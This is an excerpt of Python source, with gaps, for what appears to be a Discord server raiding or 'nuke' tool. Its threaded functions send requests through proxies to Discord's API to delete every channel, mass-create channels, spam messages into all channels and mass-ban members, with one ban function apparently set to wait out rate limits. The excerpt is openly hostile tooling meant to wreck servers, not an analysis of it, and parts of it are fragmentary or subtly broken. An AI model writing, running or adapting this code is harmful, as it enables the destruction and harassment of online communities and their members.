...
async def nuke(): 
   ...
   def delete_channel(i):
    sessions.delete(f"https://canary.discord.com/api/{random.choice(apis)}/channels/{i}",headers=headers, proxies=proxy)
   for i in range(9):
      for channel in guilda.channels:
        threading.Thread(target=delete_channel,args=(channel.id, )).start()
   print("[LOG] Nuke COMPLETED.")
...
async def raid():
   ...
   try:
       ...
       return
   def create():
     payload = {"name": str(canales), "permission_overwrites": [], "type": 0}
     try:
        requests.post(f"https://canary.discord.com/api/{random.choice(apis)}/guilds/{guilda.id}/channels", headers=headers, json=payload, proxies=proxy)
     except:
        pass 
   for i in range(int(am)):
    try:
        threading.Thread(target=create).start()
        print(f"[CHANNEL]                 {Fore.RED} CREATED {canales}, {i} TIMES.")        
    except:
...
async def spam():
    ...
    def mass_ping(i):
      json = {"content": str(spammsg),"tts": False}
      sessions.post(f"https://canary.discord.com/api/{random.choice(apis)}/channels/{i}/messages", headers=headers,json=json, proxies=proxy)
    try:
        for i in range(int(pings)):
            for channel in guilda.channels:
...
async def banall_id():
    ...
    def mass_ban(member_id):
        try:
            requests.put(f"https://canary.discord.com/api/{random.choice(apis)}/guilds/{guild.id}/bans/{member_id}", headers=headers, proxies=proxy)
            print(random.choice(colors) + f"[!] Banned {member_id}")
            if response.status_code == 429:
                print(f"[{random.choice([f'{bs}'.replace(' ', ''), '/', '-', '|'])}] ratelimited for {response.json()['retry_after']}")
                time.sleep(response.json()['retry_after'])
        except:
            print(Fore.RED + f"[!!] NOT Banned {member_id}")

    with open("./bag/ids.txt", "r") as f:
        member_ids = f.read().splitlines()

    try:
        for member_id in member_ids:
            threading.Thread(target=mass_ban, args=(member_id, )).start()
    except:
        pass
...
async def banall():
    ...
    def mass_ban(i):
        try:
            requests.put(f"https://canary.discord.com/api/{random.choice(apis)}/guilds/{guild.id}/bans/{i}",headers=headers)
